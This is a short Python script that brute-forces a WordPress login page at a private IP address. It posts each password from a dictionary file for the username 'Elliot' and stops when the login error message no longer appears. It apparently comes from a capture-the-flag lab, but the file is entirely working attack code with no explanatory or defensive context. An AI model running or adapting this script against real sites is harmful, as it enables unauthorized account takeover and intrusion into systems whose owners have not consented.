import requests

dictionary_path = "dictionary_without_repetitions.txt"
url = "http://10.10.30.32/wp-login.php"
username = "Elliot"  # Username previously found
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.30.32",
    "Connection": "keep-alive",
    "Referer": "http://10.10.30.32/wp-login.php",
    "Cookie": "wordpress_test_cookie=WP+Cookie+check",
    "Upgrade-Insecure-Requests": "1"
}

with open(dictionary_path, "r") as dictionary:
    for line in dictionary:
        pwd = line.strip()
        data = {
            "log": username,
            "pwd": pwd,
            "wp-submit": "Log In",
            "redirect_to": "http://10.10.30.32/wp-admin/",
            "testcookie": "11"
        }
        respuesta = requests.post(url, headers=headers, data=data, allow_redirects=False)
        if "The password you entered for the username" not in respuesta.text:
            print(f"[+] Password found: {pwd}")
            break
        else:
            print(f"[-] Invalid: {pwd}")
